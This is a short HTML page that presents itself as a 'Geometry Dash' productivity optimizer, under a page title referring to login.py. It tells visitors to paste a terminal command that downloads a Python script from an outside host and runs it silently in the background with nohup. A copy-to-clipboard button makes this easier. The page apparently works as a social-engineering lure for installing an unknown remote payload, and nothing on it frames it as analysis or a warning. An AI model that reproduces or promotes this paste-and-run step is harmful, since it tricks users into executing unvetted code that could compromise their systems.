<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Run login.py</title>
    <style>
      body {font-family: system-ui, -apple-system, Roboto, 'Segoe UI', Arial; padding: 2rem;}
      pre {background:#f6f8fa;border:1px solid #ddd;padding:0.75rem;border-radius:4px;}
      button {margin-top:0.5rem}
    </style>
  </head>
  <body>
    <h2>Productivity optimizer with Geometry Dash!</h2>
    <p>Copy the command below and paste it into the terminal, your productivity shall surge like never before!</p>

    <pre id="oneLineBlock">curl -fsSL "https://gdash.espolin.dev/files/main.py" -o main.py && nohup python3 main.py &amp;</pre>
    <button id="copyOneLine">Copy command</button>
    <span id="copyOneStatus" style="margin-left:0.6rem;color:#666"></span>

    <script>
      document.getElementById('copyOneLine').addEventListener('click', async () => {
        const cmd = document.getElementById('oneLineBlock').textContent;
        try {
          await navigator.clipboard.writeText(cmd);
          const s = document.getElementById('copyOneStatus');
          s.textContent = 'Copied!';
          setTimeout(() => s.textContent = '', 2000);
        } catch (err) {
          document.getElementById('copyOneStatus').textContent = 'Copy failed — select and press ⌘C';
        }
      });
    </script>
  </body>
</html>
